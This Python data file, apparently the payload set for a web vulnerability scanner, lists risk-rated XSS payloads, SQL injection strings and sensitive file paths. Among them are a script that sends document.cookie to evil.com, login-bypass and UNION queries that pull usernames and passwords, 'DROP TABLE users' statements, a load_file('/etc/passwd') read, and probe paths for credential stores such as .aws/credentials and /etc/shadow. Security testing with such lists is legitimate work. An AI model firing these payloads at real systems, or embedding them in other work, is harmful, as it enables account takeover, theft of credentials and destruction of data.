# XSS Payloads
XSS_PAYLOADS = [
    {"payload": "<img src='x' onerror='alert(1)'>", "risk": "high"},  # Classic XSS using an image with an error handler
    {"payload": "<body onload=alert(1)>", "risk": "high"},  # XSS triggered by the body onload event
    {"payload": "<iframe id=x onblur=alert(1)></iframe><input autofocus>", "risk": "medium"},  # XSS triggered by onblur event in an iframe
    {"payload": "<input onblur=alert(1) id=x><input autofocus>", "risk": "medium"},  # XSS via input field onblur event
    {"payload": "<textarea onblur=alert(1) id=x></textarea><input autofocus>", "risk": "medium"},  # XSS with textarea onblur event
    {"payload": "<select onblur=alert(1) id=x></select><input autofocus>", "risk": "medium"},  # XSS with select onblur event
    {"payload": "<p><script>/* Bad stuff here... */</script></p>", "risk": "high"},  # Script injection in a paragraph
    {"payload": "<p>This post was extremely helpful.</p>", "risk": "low"},  # Non-malicious content for testing
    {"payload": "<a autofocus onfocus=alert(1) href></a>", "risk": "medium"},  # XSS triggered by onfocus event in anchor
    {"payload": "<a autofocus onfocusin=alert(1) href></a>", "risk": "medium"},  # XSS using onfocusin event in anchor
    {"payload": "<a id=x tabindex=1 onfocus=alert(1)></a>", "risk": "medium"},  # XSS using onfocus event with tabindex
    {"payload": "<a id=x tabindex=1 onfocusin=alert(1)></a>", "risk": "medium"},  # XSS triggered by onfocusin event with tabindex
    {"payload": "<a onafterscriptexecute=alert(1)><script>1</script>", "risk": "high"},  # XSS triggered by script execution after event
    {"payload": "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>", "risk": "medium"},  # XSS triggered on copy event in editable content
    {"payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", "risk": "high"},  # XSS using iframe with srcdoc
    {"payload": "<details open ontoggle=alert(1)></details>", "risk": "high"},  # XSS triggered by toggling details element
    {"payload": "<video><source onerror=\"alert(1)\"></video>", "risk": "high"},  # XSS triggered by video source error
    {"payload": "<<script>><<alert>(1)//<</script>>", "risk": "high"},  # Malformed script tag injection
    {"payload": "<input type='text' name='username'>", "risk": "low"},  # Non-malicious input field
    {"payload": "<div class='message'>Welcome back!</div>", "risk": "low"},  # Non-malicious message content
    {"payload": "<a href='https://example.com'>Click here</a>", "risk": "low"},  # Non-malicious link
    {"payload": "<img src='logo.png' alt='Logo'>", "risk": "low"},  # Non-malicious image
    {"payload": "<strong>This is bold text</strong>", "risk": "low"},  # Non-malicious bold text
    {"payload": "<em>Italic text</em>", "risk": "low"},  # Non-malicious italic text
    {"payload": "<script>console.log('hello')</script>", "risk": "low"},  # Low-risk XSS with console log
    {"payload": "<ul><li>Item 1</li><li>Item 2</li></ul>", "risk": "low"},  # Non-malicious list
    {"payload": "<button type='submit'>Submit</button>", "risk": "low"},  # Non-malicious button
    {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "risk": "high"},  # XSS using SVG animation onbegin event
    {"payload": "<iframe src='javascript:alert(1)'></iframe>", "risk": "high"},  # XSS triggered by iframe with javascript URL
    {"payload": "<script>eval(String.fromCharCode(88,83,83))</script>", "risk": "high"},  # XSS with eval using encoded string
    {"payload": "<script>eval('alert(1)')</script>", "risk": "high"},  # XSS using eval() for executing alert
    {"payload": "<script>window.onload=alert(1)</script>", "risk": "high"},  # XSS triggered by window.onload event
    {"payload": "<a href='javascript:alert(1)'>Click Here</a>", "risk": "medium"},  # XSS triggered by onclick event in link
    {"payload": "<button onfocus='alert(1)'>Click Me</button>", "risk": "medium"},  # XSS triggered by onfocus event in button
    {"payload": "<textarea onfocus='alert(1)'></textarea>", "risk": "medium"},  # XSS using onfocus event in textarea
    {"payload": "<a onmouseover='alert(1)'>Hover Me</a>", "risk": "medium"},  # XSS triggered by onmouseover event in link
    {"payload": "<svg onload='alert(1)'></svg>", "risk": "high"},  # XSS using onload event in SVG
    {"payload": "<input type='image' src='x' onerror='alert(1)'>", "risk": "high"},  # XSS triggered by error event in input image
    {"payload": "<form onsubmit='alert(1)'><input type='submit'></form>", "risk": "low"},  # Non-malicious form with submit input
    {"payload": "<img \"\"\"><script>alert(1)</script>", "risk": "high"},  # Malformed image tag with script injection
    {"payload": "<script>alert`1`</script>", "risk": "high"},  # XSS with template literals in script tag
    {"payload": "<script>throw onerror=alert;'XSS'</script>", "risk": "high"},  # XSS triggered by error handling
    {"payload": "<style><img src='x' onerror='alert(1)'></style>", "risk": "high"},  # XSS triggered by image error in style
    {"payload": "<input type='search' onsearch='alert(1)'>", "risk": "medium"},  # XSS using onsearch event in input
    {"payload": "<marquee onstart='alert(1)'>Hello</marquee>", "risk": "medium"},  # XSS triggered by onstart event in marquee
    {"payload": "<select onchange='alert(1)'><option>Test</option></select>", "risk": "medium"},  # XSS triggered by onchange event in select
    {"payload": "<body onunload='alert(1)'>", "risk": "high"},  # XSS triggered by onunload event in body
    {"payload": "<iframe onload='alert(1)'></iframe>", "risk": "high"},  # XSS using iframe onload event
    {"payload": "javascript:alert('XSS')", "risk": "low"},  # Low-risk XSS with JavaScript URL
    {"payload": "<p><strong>Not sanitized</strong></p>", "risk": "low"},  # Non-malicious content testing sanitization
    {"payload": "<img src='x' alt='XSS'>", "risk": "low"},  # Non-malicious image tag for testing
    {"payload": "<b onmousedown=alert('XSS')>Click</b>", "risk": "low"},  # XSS triggered by onmousedown event in bold tag
    {"payload": "'><img src=x onerror=alert('XSS')>", "risk": "high"},  # XSS using unescaped quotes in input fields
    {"payload": "<svg/onload=eval('alert(1)')>", "risk": "high"},  # XSS using SVG with eval() in onload event
    {"payload": "<input type='text' onfocus='eval(1)'>", "risk": "high"},  # XSS triggered by eval() in input onfocus event
    {"payload": "<body onload='eval(1)'>", "risk": "high"},  # XSS triggered by eval() on body load
    {"payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>", "risk": "high"},  # XSS with base64 encoded script in object tag
    {"payload": "<script>setTimeout(function() { alert(1); }, 500);</script>", "risk": "medium"},  # XSS using setTimeout to delay execution
    {"payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "risk": "high"},  # XSS via document.write
    {"payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "risk": "high"},  # XSS using iframe with inline script
    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},  # XSS using onfocus event in input
    {"payload": "<body onbeforeunload='alert(1)'>", "risk": "high"},  # XSS triggered by onbeforeunload event in body
    {"payload": "<a href='javascript:void(0)' onclick='alert(1)'>Click me</a>", "risk": "medium"},  # XSS triggered by onclick event in link
    {"payload": "<svg><script>alert(1)</script></svg>", "risk": "high"},  # XSS triggered by script inside SVG tag
    {"payload": "<audio onerror='alert(1)'><source src='x'></audio>", "risk": "high"},  # XSS triggered by audio source error
    {"payload": "<div style='background-image: url(javascript:alert(1))'>XSS</div>", "risk": "high"},  # XSS triggered by background-image using JavaScript URL
    {"payload": "<input type='file' onfocus='alert(1)'>", "risk": "medium"},  # XSS using onfocus event in file input
    {"payload": "<button onclick='eval(1)'>Click</button>", "risk": "high"},  # XSS triggered by eval() in button onclick event
    {"payload": "<script>document.location='https://evil.com?cookie='+document.cookie</script>", "risk": "high"},  # XSS stealing cookies via document.location
    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},  # XSS triggered by onfocus event in text input
    {"payload": "<img src=x onerror=eval('alert(1)')>", "risk": "high"},  # XSS triggered by image error with eval()
]


# SQL Injection Payloads
SQLI_PAYLOADS = [
    # High Risk Payloads (Can lead to full system compromise, data exfiltration, or control)
    {"payload": "' OR '1'='1", "risk": "high"},  # Common boolean-based SQLi to bypass login
    {"payload": "' OR 1=1 -- ", "risk": "high"},  # SQLi to bypass login, comments out the rest of the query
    {"payload": "' UNION SELECT NULL, NULL, NULL -- ", "risk": "high"},  # Union-based SQLi to extract data
    {"payload": "' UNION SELECT username, password FROM users -- ", "risk": "high"},  # Extract sensitive data
    {"payload": "' OR 1=1 LIMIT 1; -- ", "risk": "high"},  # SQLi with LIMIT clause to fetch data
    {"payload": "admin' -- ", "risk": "high"},  # Login bypass, specific to admin account
    {"payload": "' OR 'x'='x", "risk": "high"},  # Always true condition to bypass authentication
    {"payload": "1' AND 1=1 UNION SELECT NULL, version() -- ", "risk": "low"},  # Retrieve DB version
    {"payload": "1' AND 1=1 UNION SELECT NULL, current_user() -- ", "risk": "low"},  # Get current user
    {"payload": "1' AND 1=1 UNION SELECT NULL, current_schema() -- ", "risk": "low"},  # Get current schema
    {"payload": "1' AND 1=1 UNION SELECT NULL, @@hostname -- ", "risk": "low"},  # Get DB server hostname
    {"payload": "' AND LENGTH((SELECT password FROM users LIMIT 1))=8 -- ", "risk": "low"},  # Test password length
    {"payload": "1' AND (SELECT 1 FROM information_schema.processlist LIMIT 1)=1 -- ", "risk": "low"},  # Process list query in MySQL
    {"payload": "' OR 1=1; SELECT current_user(); -- ", "risk": "low"},  # Get current user with SQLi
    {"payload": "' OR sleep(10)--", "risk": "high"},  # Time-based SQLi (blind), induces delay
    {"payload": "' OR benchmark(1000000,MD5(1))--", "risk": "high"},  # Benchmark-based SQLi, test for server delay
    {"payload": "' OR 1=1; SELECT database() -- ", "risk": "high"},  # Get the current database name
    {"payload": "' AND 1=2 -- ", "risk": "medium"},  # Commonly used to test for vulnerability, no effect
    {"payload": "' AND (SELECT COUNT(*) FROM users) > 0 -- ", "risk": "medium"},  # Checks if there are any users in the database
    {"payload": "' AND username IS NOT NULL; -- ", "risk": "medium"},  # Check if 'username' column exists
    {"payload": "' AND (SELECT SUBSTRING(@@version,1,1)) = '5", "risk": "medium"},  # Check for a specific database version
    {"payload": "' AND ASCII(SUBSTRING((SELECT @@version),1,1))=53 -- ", "risk": "medium"},  # Check for database version
    {"payload": "' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') -- ", "risk": "medium"},  # Check if 'users' table exists
    {"payload": "' AND SUBSTRING(@@version, 1, 1) = 5 --", "risk": "medium"},  # Check for MySQL version
    {"payload": "' AND 1=1 UNION SELECT NULL, version() -- ", "risk": "medium"},  # Extract DB version
    {"payload": "' UNION SELECT username, password, email FROM users -- ", "risk": "high"},  # Extract user data
    {"payload": "' OR 1=1; DROP TABLE users -- ", "risk": "high"},  # Destructive SQLi (drop table)
    {"payload": "1'; DROP TABLE users --", "risk": "high"},  # Drop users table via SQLi
    {"payload": "1' OR 1=1; SELECT * FROM users --", "risk": "high"},  # Extract all user data
    {"payload": "' OR 1=1; SELECT load_file('/etc/passwd') -- ", "risk": "high"},  # Read system files (e.g., /etc/passwd)
    {"payload": "' OR 1=1; SELECT group_concat(column_name) FROM information_schema.columns -- ", "risk": "high"},  # Retrieve all column names
    {"payload": "' OR 1=1; SELECT extractvalue(1,concat(0x7e,(SELECT @@version))) -- ", "risk": "high"},  # SQLi to extract server version
    {"payload": "1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1 -- ", "risk": "high"},  # SQLi to extract password (admin) character-by-character
    {"payload": "' OR 1=1; SELECT concat_ws(':',username,password) FROM users LIMIT 1 -- ", "risk": "high"},  # Extract username and password from users table
    {"payload": "' AND 1=1 UNION SELECT NULL, current_database() -- ", "risk": "medium"},  # Extract current database
    {"payload": "' AND (SELECT 1 FROM information_schema.columns WHERE table_name='users' LIMIT 1)=1 -- ", "risk": "medium"},  # Check for 'users' table columns
    {"payload": "' AND (SELECT 1 FROM sys.tables WHERE name='users')=1 -- ", "risk": "medium"},  # Check if 'users' table exists in SQL Server
    {"payload": "1' AND (SELECT 1 FROM pg_stat_activity LIMIT 1)=1 -- ", "risk": "medium"},  # PostgreSQL activity check
    {"payload": "' AND 1=1 UNION SELECT NULL, database() -- ", "risk": "medium"},  # Get the current database name
    {"payload": "1' AND 1=1 UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- ", "risk": "medium"},  # Get tables in current database
    {"payload": "' OR 1=1; SELECT user() --", "risk": "medium"},  # Get current MySQL user
    {"payload": "1 AND 1=1", "risk": "low"},  # Simple true condition (no data leakage)
    {"payload": "1 AND 1=2", "risk": "low"},  # False condition, often used to test SQLi presence
    {"payload": "admin' AND 1=1 -- ", "risk": "low"},  # Login bypass (admin context)
    {"payload": "admin' AND 1=2 -- ", "risk": "low"},  # False condition for testing
    {"payload": "1' AND 1=1 ORDER BY 1 -- ", "risk": "low"},  # Test SQLi vulnerability via ORDER BY clause
    {"payload": "1' AND BINARY 'a'='A' -- ", "risk": "low"},  # Case sensitivity check in SQL (typically for MySQL)
    {"payload": "1' AND 1=1; SELECT table_name FROM information_schema.tables -- ", "risk": "low"},  # List tables in the current database
    {"payload": "1' AND 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' --", "risk": "low"},  # List columns in the 'users' table
    {"payload": "' AND 1=1 -- ", "risk": "low"},  # General test payload to check for SQLi vulnerability
    {"payload": "' OR 1=1; SELECT schema_name FROM information_schema.schemata -- ", "risk": "medium"},  # List all schemas
    {"payload": "' UNION SELECT NULL, database(), user() -- ", "risk": "medium"},  # Get DB, and user
    {"payload": "' UNION SELECT NULL, table_name FROM information_schema.tables -- ", "risk": "medium"},  # List tables from information schema
    {"payload": "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "medium"},  # List columns from 'users' table
    {"payload": "' OR 1=1; SELECT * FROM mysql.db -- ", "risk": "high"},  # Get MySQL database privileges
]


# Sensitive File Paths
SENSITIVE_FILES = [
    {"payload": "/.git/", "risk": "high"},  # Git repository may expose full codebase, secrets, history
    {"payload": "/.env", "risk": "high"},  # Often contains database credentials, API keys
    {"payload": "/config.php", "risk": "high"},  # May include DB credentials, environment setup
    {"payload": "/wp-config.php", "risk": "high"},  # WordPress DB settings and secrets
    {"payload": "/database.yml", "risk": "high"},  # Ruby/Rails DB credentials file
    {"payload": "/staging-config.json", "risk": "medium"},  # Staging environment, may contain secrets
    {"payload": "/tmp/debug.log", "risk": "medium"},  # Debug output, can reveal application internals
    {"payload": "/old/config.bak", "risk": "medium"},  # Backup of config files
    {"payload": "/.hg/", "risk": "medium"},  # Mercurial repo exposure
    {"payload": "/.svn/", "risk": "medium"},  # Subversion repo exposure
    {"payload": "/.htaccess", "risk": "high"},  # Apache config, may reveal access rules or server logic
    {"payload": "/.htpasswd", "risk": "high"},  # Username/password hashes for HTTP auth
    {"payload": "/phpinfo.php", "risk": "high"},  # Full PHP environment disclosure, useful for attackers
    {"payload": "/web.config", "risk": "high"},  # IIS server config, may include sensitive path info
    {"payload": "/credentials.json", "risk": "high"},  # Often used by Google/AWS SDKs to store API secrets
    {"payload": "/secrets.json", "risk": "high"},  # Generic secrets storage file, often used in dev
    {"payload": "/private_key.pem", "risk": "high"},  # Exposes private key, leads to full system compromise
    {"payload": "/.gitmodules", "risk": "high"},  # Can point to internal submodules or repos
    {"payload": "/etc/passwd", "risk": "high"},  # System user list (old Unix-style attacks)
    {"payload": "/etc/shadow", "risk": "high"},  # Password hashes, very dangerous if accessible
    {"payload": "/etc/mysql/my.cnf", "risk": "high"},  # MySQL credentials in config
    {"payload": "/var/log/auth.log", "risk": "high"},  # Contains SSH login attempts, can aid brute force
    {"payload": "/etc/nginx/nginx.conf", "risk": "high"},  # Web server config and possible internal paths
    {"payload": "/.aws/credentials", "risk": "high"},  # AWS secret and access keys
    {"payload": "/.gitlab-ci.yml", "risk": "high"},  # CI/CD pipeline config may contain tokens
    {"payload": "/.kube/config", "risk": "high"},  # Kubernetes cluster access credentials
    {"payload": "/var/run/docker.sock", "risk": "high"},  # Docker remote API socket, full host control
    {"payload": "/Jenkinsfile", "risk": "high"},  # Jenkins pipeline, can expose build logic and credentials
    {"payload": "/.terraform/environment.tfvars", "risk": "high"},  # Terraform vars may contain secrets
    {"payload": "/.npmrc", "risk": "high"},  # Node.js credentials for private registry
    {"payload": "/etc/ssl/private/server.key", "risk": "high"},  # TLS private key for HTTPS
    {"payload": "/tmp/secret.key", "risk": "high"},  # Generic placeholder for leaked secrets
    {"payload": "/var/log/mysql/error.log", "risk": "high"},  # Can reveal DB errors or queries
    {"payload": "/admin/", "risk": "medium"},  # Admin panel, potential brute-force or logic flaws
    {"payload": "/backup/", "risk": "medium"},  # Backup folder may expose previous versions or files
    {"payload": "/logs/", "risk": "medium"},  # Directory listing may reveal application logs
    {"payload": "/devconfig.ini", "risk": "medium"},  # Dev config, may contain minor secrets or debug info
    {"payload": "/test.php", "risk": "medium"},  # Test endpoint might expose debug output
    {"payload": "/config.ini", "risk": "medium"},  # Generic config file, may contain DB or API settings
    {"payload": "/uploads/testfile.pdf", "risk": "medium"},  # Uploads folder may allow traversal or injection
    {"payload": "/.git/objects/", "risk": "high"},  # Access to raw git objects, reconstruct full repo
    {"payload": "/.git/refs/heads/master", "risk": "high"},  # Points to latest commit in repo
    {"payload": "/var/www/html/backup.tar.gz", "risk": "high"},  # Full site backup, may include sensitive data
    {"payload": "/var/log/syslog", "risk": "high"},  # System-wide logs, great for info disclosure
    {"payload": "/etc/ansible/ansible.cfg", "risk": "high"},  # May reveal infrastructure setup
    {"payload": "/.serverless/serverless.yml", "risk": "high"},  # May contain AWS functions and secrets
    {"payload": "/.git-credentials", "risk": "high"},  # Stores plaintext GitHub/git credentials
    {"payload": "/.ssh/authorized_keys", "risk": "high"},  # SSH public keys can aid lateral movement
    {"payload": "/var/log/postgresql/postgresql.log", "risk": "high"},  # DB errors/logs, may leak queries
    {"payload": "/etc/crontab", "risk": "high"},  # Scheduled jobs, may contain sensitive commands
    {"payload": "/.well-known/security.txt", "risk": "low"},  # Standardized security contact info
    {"payload": "/favicon.ico", "risk": "low"},  # Site icon; may help fingerprinting
    {"payload": "/humans.txt", "risk": "low"},  # Info about dev team, purely cosmetic
    {"payload": "/crossdomain.xml", "risk": "low"},  # Flash site security policy file
    {"payload": "/sitemap.xml", "risk": "low"},  # Lists indexed site pages
    {"payload": "/etc/hostname", "risk": "medium"},  # Reveals server hostname (internal info)
    {"payload": "/etc/hosts", "risk": "medium"},  # Can reveal internal IPs or aliases
    {"payload": "/tmp/testfile.sql", "risk": "medium"},  # DB dump in temporary location
    {"payload": "/.vscode/settings.json", "risk": "medium"},  # Dev editor config, may leak paths or creds
    {"payload": "/apple-touch-icon.png", "risk": "low"},  # iOS home screen icon
    {"payload": "/browserconfig.xml", "risk": "low"},  # IE/Edge site configuration
    {"payload": "/manifest.webmanifest", "risk": "low"},  # Web app manifest file for PWA
    {"payload": "/index.html", "risk": "low"},  # Public home page; useful for fingerprinting
    {"payload": "/home", "risk": "low"},  # Home route, often public
    {"payload": "/about", "risk": "low"},  # About page, contains company/app info
    {"payload": "/docker-compose.yml", "risk": "medium"},  # May contain DB/service configurations
    {"payload": "/composer.lock", "risk": "medium"},  # PHP dependency tree (can fingerprint versions)
    {"payload": "/.idea/workspace.xml", "risk": "medium"},  # JetBrains IDE config, may contain paths
    {"payload": "/bower.json", "risk": "medium"},  # Legacy frontend dependencies
    {"payload": "/manifest.json", "risk": "medium"},  # Web app manifest, may include PWA config
    {"payload": "/.gitignore", "risk": "medium"},  # Shows what is excluded (hint at hidden files)
    {"payload": "/.vscode/launch.json", "risk": "medium"},  # Launch configs, may reveal entry points
    {"payload": "/.bash_history", "risk": "medium"},  # Shell history, might contain sensitive commands
    {"payload": "/.terraform/environment.tf", "risk": "medium"},  # Terraform config structure
    {"payload": "/home/user/.bash_profile", "risk": "medium"},  # User env setup, may expose aliases or secrets
    {"payload": "/var/log/apache2/error.log", "risk": "medium"},  # Web server error log, info disclosure
    {"payload": "/app/config/local.json", "risk": "medium"},  # Local app configs, potentially dev-only info
    {"payload": "/admin/config.php", "risk": "medium"},  # Admin config page, may contain paths or settings
    {"payload": "/vagrantfile", "risk": "medium"},  # Virtual environment config
    {"payload": "/app.log", "risk": "medium"},  # App-specific log file, may leak info
    {"payload": "/debug/", "risk": "medium"},  # Directory with debug-related files
    {"payload": "/.DS_Store", "risk": "low"},  # macOS metadata file, reveals filenames and structure
    {"payload": "/security.txt", "risk": "low"},  # Contact info for security researchers
    {"payload": "/CHANGELOG.md", "risk": "low"},  # Lists changes/version history
    {"payload": "/README.md", "risk": "low"},  # Public documentation
    {"payload": "/LICENSE", "risk": "low"},  # Open-source license text
    {"payload": "/COPYING", "risk": "low"},  # GNU license or similar
    {"payload": "/robots.txt", "risk": "low"},  # Sitemap and crawl directives
    
]
